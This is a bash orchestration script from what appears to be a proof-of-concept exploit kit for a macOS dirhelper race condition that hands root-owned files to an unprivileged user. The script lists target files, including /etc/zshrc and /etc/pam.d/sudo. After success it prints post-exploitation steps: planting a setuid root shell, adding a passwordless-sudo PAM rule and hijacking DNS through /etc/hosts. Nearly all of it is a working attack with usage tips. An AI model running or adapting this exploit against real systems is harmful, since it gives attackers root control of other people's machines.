#!/bin/bash
#
# exploit.sh - Glarus PoC Main Exploit Script
#
# Orchestrates the complete attack:
# 1. Sets up the hardlink structure
# 2. Starts the race condition binary
# 3. Triggers dirhelper repeatedly
# 4. Reports success or failure
#
# Usage:
#   ./exploit.sh <target_file>
#   ./exploit.sh --test <target_file>
#   ./exploit.sh --list
#
# Environment Variables:
#   GLARUS_MAX_ATTEMPTS  - Maximum race attempts (default: 50000)
#   GLARUS_RACE_MODE     - Race mode: spin, kqueue, hybrid (default: spin)
#   GLARUS_TRIGGERS      - Number of dirhelper triggers (default: 5000)
#
#
# NEW ARCHITECTURE:
#   1. Setup hardlink structure
#   2. Spawn DirhelperClient with count=N (loops internally, sandbox inits ONCE)
#   3. Spawn race_swap in parallel (monitors and swaps)
#   4. Wait for either to signal success or timeout
#
# This eliminates the sandbox crash problem because DirhelperClient only
# initializes once, not 5000 times.
#
# Copyright (c) 2025 Golden Helm Securities
#

set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
ROOT_DIR="$(dirname "$SCRIPT_DIR")"
BUILD_DIR="$ROOT_DIR/build"

BUNDLE_ID="${GLARUS_BUNDLE_ID:-com.glarus.poc}"
CONTAINER_BASE="$HOME/Library/Containers/$BUNDLE_ID"

CLIENT_APP="$BUILD_DIR/DirhelperClient.app/Contents/MacOS/DirhelperClient"
RACE_BINARY="$BUILD_DIR/race_swap"

# Configuration
TRIGGER_COUNT="${GLARUS_TRIGGERS:-10000}"
TRIGGER_DELAY="${GLARUS_DELAY:-500}"      # microseconds between triggers
TIMEOUT="${GLARUS_TIMEOUT:-60}"           # seconds
DEFAULT_TARGET="/etc/hosts"

# PIDs for cleanup
CLIENT_PID=""
RACE_PID=""

cleanup() {
    # Kill any background processes
    [ -n "$CLIENT_PID" ] && kill $CLIENT_PID 2>/dev/null || true
    [ -n "$RACE_PID" ] && kill $RACE_PID 2>/dev/null || true
    wait 2>/dev/null || true
}

trap cleanup EXIT

usage() {
    cat << 'EOF'
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  Glarus PoC v4 - macOS dirhelper Privilege Escalation
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Usage:
  ./exploit.sh <target_file>         Run exploit against target file
  ./exploit.sh --test <target_file>  Test if target can be exploited
  ./exploit.sh --list                List suggested targets
  ./exploit.sh --help                Show this help

Environment Variables:
  GLARUS_TRIGGERS=10000   Number of dirhelper triggers
  GLARUS_DELAY=500        Microseconds between triggers
  GLARUS_TIMEOUT=60       Timeout in seconds

Examples:
  ./exploit.sh /etc/hosts
  ./exploit.sh /etc/zshrc
  GLARUS_TRIGGERS=50000 GLARUS_DELAY=100 ./exploit.sh /etc/newsyslog.conf

NEW IN v4:
  DirhelperClient now loops internally, initializing sandbox only ONCE.
  This eliminates crashes from mid-swap sandbox initialization.

EOF
}

list_targets() {
    cat << 'EOF'
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  Suggested Target Files
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Confirmed Exploitable (no TCC/SIP protection):
  /etc/hosts              DNS hijacking
  /etc/newsyslog.conf     Log rotation â†’ file overwrite
  /etc/asl.conf           System logging configuration
  /etc/zshrc              Code exec when root runs shell (sudo -s)
  /etc/zprofile           Code exec on root login shells
  /etc/kern_loader.conf   Legacy config (may be writable)

Possibly TCC Protected:
  /etc/pam.d/sudo         Bypass sudo authentication
  /etc/pam.d/su           Bypass su authentication

Test with: ./exploit.sh --test <target_file>

EOF
}

test_target() {
    local target="$1"
    local test_dir="/tmp/glarus_test_$$"
    
    echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
    echo "  Testing Target: $target"
    echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
    echo
    
    if [ ! -f "$target" ]; then
        echo "[âœ—] File does not exist"
        return 1
    fi
    echo "[âœ“] File exists"
    
    if [ ! -r "$target" ]; then
        echo "[âœ—] File is not readable"
        return 1
    fi
    echo "[âœ“] File is readable"
    
    local target_fs=$(df "$target" 2>/dev/null | tail -1 | awk '{print $1}')
    local container_fs=$(df "$HOME/Library" 2>/dev/null | tail -1 | awk '{print $1}')
    
    if [ "$target_fs" != "$container_fs" ]; then
        echo "[âœ—] Different filesystems - hardlink will fail"
        return 1
    fi
    echo "[âœ“] Same filesystem"
    
    mkdir -p "$test_dir"
    if ln "$target" "$test_dir/test_link" 2>/dev/null; then
        echo "[âœ“] Hardlink creation successful"
        rm -rf "$test_dir"
        echo
        echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
        echo "  âœ“ TARGET IS EXPLOITABLE"
        echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
        echo
        echo "Run: ./exploit.sh $target"
        return 0
    else
        rm -rf "$test_dir"
        echo "[âœ—] Hardlink creation failed (SIP/TCC protected?)"
        echo
        echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
        echo "  âœ— TARGET IS NOT EXPLOITABLE"
        echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
        return 1
    fi
}

run_exploit() {
    local target="$1"
    
    echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
    echo "  Glarus PoC v4 - Running Exploit"
    echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
    echo
    echo "Bundle ID:      $BUNDLE_ID"
    echo "Target:         $target"
    echo "Triggers:       $TRIGGER_COUNT"
    echo "Trigger delay:  ${TRIGGER_DELAY}Î¼s"
    echo "Timeout:        ${TIMEOUT}s"
    echo
    
    # Check binaries exist
    if [ ! -x "$CLIENT_APP" ]; then
        echo "ERROR: DirhelperClient not found. Run ./scripts/build.sh first"
        exit 1
    fi
    echo "[âœ“] DirhelperClient found"
    
    if [ ! -x "$RACE_BINARY" ]; then
        echo "ERROR: race_swap not found. Run ./scripts/build.sh first"
        exit 1
    fi
    echo "[âœ“] Race binary found"
    
    # Quick hardlink test
    local test_dir="/tmp/glarus_quick_$$"
    mkdir -p "$test_dir"
    if ! ln "$target" "$test_dir/test" 2>/dev/null; then
        echo "ERROR: Cannot create hardlink to $target"
        rm -rf "$test_dir"
        exit 1
    fi
    rm -rf "$test_dir"
    echo "[âœ“] Hardlink test passed"
    
    # Calculate buffer size for truncation
    local container_path="$CONTAINER_BASE/Data"
    local buffer_size=$((${#container_path} + 5))
    echo "[âœ“] Buffer size: $buffer_size (triggers truncation)"
    
    # Record original ownership
    local original_owner=$(stat -f "%u" "$target" 2>/dev/null || stat -c "%u" "$target")
    local my_uid=$(id -u)
    
    # Setup hardlink structure
    echo
    echo "[*] Setting up hardlink structure..."
    chmod +x "$SCRIPT_DIR/setup.sh" 2>/dev/null || true
    "$SCRIPT_DIR/setup.sh" "$target"
    
    echo
    echo "[*] Starting parallel race..."
    echo "    Architecture: DirhelperClient loops internally (sandbox inits ONCE)"
    echo
    
    # Create a temp file to signal success
    SUCCESS_FLAG="/tmp/glarus_success_$$"
    rm -f "$SUCCESS_FLAG"
    
    #â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    # Start race_swap in background
    # It monitors Data/ and swaps when it detects mkdir
    #â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    (
        "$RACE_BINARY" -c "$BUNDLE_ID" -t "$target" -T "$TIMEOUT"
        if [ $? -eq 0 ]; then
            touch "$SUCCESS_FLAG"
        fi
    ) &
    RACE_PID=$!
    
    # Give race_swap time to start monitoring
    sleep 0.5
    
    #â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    # Start DirhelperClient in background
    # It makes TRIGGER_COUNT MIG calls with TRIGGER_DELAY between each
    #â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    "$CLIENT_APP" "$BUNDLE_ID" 1 "$buffer_size" "$TRIGGER_COUNT" "$TRIGGER_DELAY" &
    CLIENT_PID=$!
    
    echo "[*] DirhelperClient PID: $CLIENT_PID"
    echo "[*] race_swap PID: $RACE_PID"
    echo
    
    # Wait for either process to finish
    while true; do
        # Check if race_swap won
        if [ -f "$SUCCESS_FLAG" ]; then
            echo
            echo "[*] Success flag detected!"
            break
        fi
        
        # Check if race_swap is still running
        if ! kill -0 $RACE_PID 2>/dev/null; then
            # race_swap exited - check if it was success
            wait $RACE_PID 2>/dev/null
            RACE_EXIT=$?
            if [ $RACE_EXIT -eq 0 ] || [ -f "$SUCCESS_FLAG" ]; then
                break
            fi
            echo "[*] race_swap exited (code: $RACE_EXIT)"
            break
        fi
        
        # Check if DirhelperClient finished
        if ! kill -0 $CLIENT_PID 2>/dev/null; then
            echo "[*] DirhelperClient finished all triggers"
            # Give race_swap a moment to process final events
            sleep 1
            # Check one more time
            if [ -f "$SUCCESS_FLAG" ]; then
                break
            fi
            # Stop race_swap
            kill $RACE_PID 2>/dev/null || true
            break
        fi
        
        sleep 0.5
    done
    
    # Clean up
    rm -f "$SUCCESS_FLAG"
    kill $CLIENT_PID 2>/dev/null || true
    kill $RACE_PID 2>/dev/null || true
    wait 2>/dev/null || true
    
    # Clear the PIDs so trap doesn't try to kill them again
    CLIENT_PID=""
    RACE_PID=""
    
    echo
    
    # Check result
    local new_owner=$(stat -f "%u" "$target" 2>/dev/null || stat -c "%u" "$target")
    
    echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
    
    if [ "$new_owner" = "$my_uid" ]; then
        echo
        echo "  ðŸŽ‰ SUCCESS! You now own: $target"
        echo
        echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
        echo
        echo "File ownership changed:"
        echo "  Before: uid=$original_owner (root)"
        echo "  After:  uid=$new_owner (you)"
        echo
        ls -la "$target"
        echo
        
        # Post-exploitation hints
        case "$target" in
            */zshrc|*/zprofile)
                echo "Next steps for privilege escalation:"
                echo "  # Add payload that runs when root spawns a shell:"
                echo "  cat >> $target << 'PAYLOAD'"
                echo '  if [ "$EUID" -eq 0 ]; then'
                echo '    cp /bin/zsh /tmp/rootsh && chmod 4755 /tmp/rootsh'
                echo '  fi'
                echo "  PAYLOAD"
                echo "  sudo -s   # Triggers payload"
                echo "  /tmp/rootsh  # Root shell!"
                ;;
            */pam.d/sudo)
                echo "Next steps:"
                echo "  echo 'auth sufficient pam_permit.so' | cat - $target > /tmp/sudo_new"
                echo "  cp /tmp/sudo_new $target"
                echo "  sudo -s   # No password!"
                ;;
            */hosts)
                echo "You can now modify DNS entries:"
                echo "  echo '192.168.1.100 target-site.com' >> $target"
                ;;
            *)
                echo "You now have write access to this file."
                ;;
        esac
        echo
        return 0
    else
        echo
        echo "  âœ— Exploit did not succeed"
        echo
        echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
        echo
        echo "Owner unchanged: uid=$new_owner (wanted: $my_uid)"
        echo
        echo "Tips:"
        echo "  â€¢ Run again (race conditions are probabilistic)"
        echo "  â€¢ More triggers: GLARUS_TRIGGERS=50000 ./exploit.sh $target"
        echo "  â€¢ Faster triggers: GLARUS_DELAY=100 ./exploit.sh $target"
        echo "  â€¢ Try: GLARUS_TRIGGERS=50000 GLARUS_DELAY=100 ./exploit.sh $target"
        echo
        return 1
    fi
}

#â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Main
#â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

# Fix script permissions
for script in "$SCRIPT_DIR"/*.sh; do
    [ -f "$script" ] && chmod +x "$script" 2>/dev/null || true
done

if [ $# -eq 0 ]; then
    usage
    exit 0
fi

case "$1" in
    --help|-h)
        usage
        ;;
    --list|-l)
        list_targets
        ;;
    --test|-t)
        if [ -z "$2" ]; then
            echo "Usage: $0 --test <target_file>"
            exit 1
        fi
        test_target "$2"
        ;;
    -*)
        echo "Unknown option: $1"
        usage
        exit 1
        ;;
    *)
        run_exploit "$1"
        ;;
esac
